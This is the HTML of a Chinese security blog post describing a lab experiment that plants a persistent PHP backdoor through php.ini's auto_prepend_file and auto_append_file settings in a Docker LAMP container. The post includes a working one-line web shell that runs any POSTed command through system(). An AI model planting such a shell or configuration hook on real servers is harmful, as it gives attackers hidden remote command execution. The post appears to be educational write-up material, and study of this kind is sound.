@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="前言看到一个比较有意思的知识点，记录一下。 配置参数在php.ini的数据处理配置选项中有两个配置项auto_prepend_file与auto_append_file,  auto_prepend_file的作用是在php程序加载执行第一个php文件之前加载指定的php文件。 而auto_append_file则是加载执行完成后加载指定的php文件。 对这两个配置项加载的文件的指定是通过incl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用php-ini构成的后门">
+<meta property="og:url" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8&#x2F;">
+<meta property="og:site_name" content="Rj45&#39;s blog">
+<meta property="og:description" content="前言看到一个比较有意思的知识点，记录一下。 配置参数在php.ini的数据处理配置选项中有两个配置项auto_prepend_file与auto_append_file,  auto_prepend_file的作用是在php程序加载执行第一个php文件之前加载指定的php文件。 而auto_append_file则是加载执行完成后加载指定的php文件。 对这两个配置项加载的文件的指定是通过incl">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8&#x2F;1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8&#x2F;2.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8&#x2F;3.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8&#x2F;4.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8&#x2F;5.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8&#x2F;6.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8&#x2F;7.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8&#x2F;8.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8&#x2F;9.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8&#x2F;10.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8&#x2F;11.png">
+<meta property="og:updated_time" content="2019-11-23T16:48:47.894Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8&#x2F;1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/my.jpg">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/my.jpg" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/my.jpg">
+          
+        
+    
+    <!-- title -->
+    <title>利用php-ini构成的后门</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+<link rel="alternate" href="/atom.xml" title="Rj45's blog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">home</a></li>
+         
+          <li><a href="/archives/">articles</a></li>
+         
+          <li><a href="/web/">web</a></li>
+         
+          <li><a href="/penetration/">penetration</a></li>
+         
+          <li><a href="/pwn/">pwn</a></li>
+         
+          <li><a href="/docker">docker</a></li>
+         
+          <li><a href="/resources/">resources</a></li>
+         
+          <li><a href="/firends/">firends</a></li>
+         
+          <li><a href="/about/">about</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/%E4%BB%8Eupload-labs%E5%AD%A6%E4%B9%A0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://rj45mp.github.io/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://rj45mp.github.io/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/&text=利用php-ini构成的后门" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://rj45mp.github.io/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/&title=利用php-ini构成的后门" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rj45mp.github.io/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/&is_video=false&description=利用php-ini构成的后门" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=利用php-ini构成的后门&body=Check out this article: https://rj45mp.github.io/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://rj45mp.github.io/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/&title=利用php-ini构成的后门" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://rj45mp.github.io/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/&title=利用php-ini构成的后门" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://rj45mp.github.io/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/&title=利用php-ini构成的后门" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://rj45mp.github.io/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/&title=利用php-ini构成的后门" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://rj45mp.github.io/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/&name=利用php-ini构成的后门&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#配置参数"><span class="toc-number">2.</span> <span class="toc-text">配置参数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#构造后门实验"><span class="toc-number">3.</span> <span class="toc-text">构造后门实验</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#后续"><span class="toc-number">4.</span> <span class="toc-text">后续</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        利用php-ini构成的后门
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Rj45's blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-10-23T16:42:41.000Z" itemprop="datePublished">2019-10-24</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>看到一个比较有意思的知识点，记录一下。</p>
+<h1 id="配置参数"><a href="#配置参数" class="headerlink" title="配置参数"></a>配置参数</h1><p>在php.ini的数据处理配置选项中有两个配置项<code>auto_prepend_file与auto_append_file</code>,</p>
+<p><img src="/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/1.png" alt="img"></p>
+<p>auto_prepend_file的作用是在php程序加载执行第一个php文件之前加载指定的php文件。</p>
+<p>而auto_append_file则是加载执行完成后加载指定的php文件。</p>
+<p>对这两个配置项加载的文件的指定是通过<code>include_path</code>实现的：</p>
+<p><img src="/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/2.png" alt="img"></p>
+<p>两者有点类似文件包含利用到的几个函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include()、require()、include_once()、require_once()</span><br></pre></td></tr></table></figure>
+
+<p>其实现的功能大概是在特定的应用场景下对所有的代码在执行前或者执行后进行统一处理。</p>
+<p>被加载进来的特定文件相当于全局文件（类似对局部函数与全局函数的理解）。</p>
+<p>由此产生了一些特殊的利用方式，例如利用其功能构造后门或者在awd中更轻松的上waf。</p>
+<h1 id="构造后门实验"><a href="#构造后门实验" class="headerlink" title="构造后门实验"></a>构造后门实验</h1><p>1、环境<br>在docker环境下</p>
+<p>1）pull镜像</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull tutum/lamp</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/3.png" alt="img"></p>
+<p>2）创建容器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -d -it -p 80:80 -p 3306:3306 --name=web tutum/lamp /bin/bash</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/4.png" alt="img"></p>
+<p>3）进入容器、启动web服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker attach webservice apache2 startnetstat -apt</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/5.png" alt="img"></p>
+<p>2、配置<br>编辑php.ini文件，指定被加载文件路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/php5/apache2/php.ini</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/6.png" alt="img"></p>
+<p>3、配置参数</p>
+<p>配置参数auto_prepend_file</p>
+<p><img src="/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/7.png" alt="img"></p>
+<p>4、编辑指定加载的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php@system($_POST[&apos;Rj45&apos;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/8.png" alt="img"></p>
+<p>5、验证</p>
+<p><img src="/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/9.png" alt="img"></p>
+<p><img src="/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/10.png" alt="img"></p>
+<p>auto_append_file同理(修改后需要重启web服务)</p>
+<p><img src="/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/11.png" alt="img"></p>
+<h1 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h1><p>当然可能还有更加猥琐的利用。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">home</a></li>
+         
+          <li><a href="/archives/">articles</a></li>
+         
+          <li><a href="/web/">web</a></li>
+         
+          <li><a href="/penetration/">penetration</a></li>
+         
+          <li><a href="/pwn/">pwn</a></li>
+         
+          <li><a href="/docker">docker</a></li>
+         
+          <li><a href="/resources/">resources</a></li>
+         
+          <li><a href="/firends/">firends</a></li>
+         
+          <li><a href="/about/">about</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#配置参数"><span class="toc-number">2.</span> <span class="toc-text">配置参数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#构造后门实验"><span class="toc-number">3.</span> <span class="toc-text">构造后门实验</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#后续"><span class="toc-number">4.</span> <span class="toc-text">后续</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://rj45mp.github.io/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://rj45mp.github.io/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/&text=利用php-ini构成的后门" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://rj45mp.github.io/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/&title=利用php-ini构成的后门" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rj45mp.github.io/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/&is_video=false&description=利用php-ini构成的后门" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=利用php-ini构成的后门&body=Check out this article: https://rj45mp.github.io/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://rj45mp.github.io/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/&title=利用php-ini构成的后门" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://rj45mp.github.io/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/&title=利用php-ini构成的后门" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://rj45mp.github.io/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/&title=利用php-ini构成的后门" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://rj45mp.github.io/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/&title=利用php-ini构成的后门" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://rj45mp.github.io/%E5%88%A9%E7%94%A8php-ini%E6%9E%84%E6%88%90%E7%9A%84%E5%90%8E%E9%97%A8/&name=利用php-ini构成的后门&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Rj45
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">home</a></li>
+         
+          <li><a href="/archives/">articles</a></li>
+         
+          <li><a href="/web/">web</a></li>
+         
+          <li><a href="/penetration/">penetration</a></li>
+         
+          <li><a href="/pwn/">pwn</a></li>
+         
+          <li><a href="/docker">docker</a></li>
+         
+          <li><a href="/resources/">resources</a></li>
+         
+          <li><a href="/firends/">firends</a></li>
+         
+          <li><a href="/about/">about</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?539c6b41d72f90d25e5ad9d0db4f2321";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
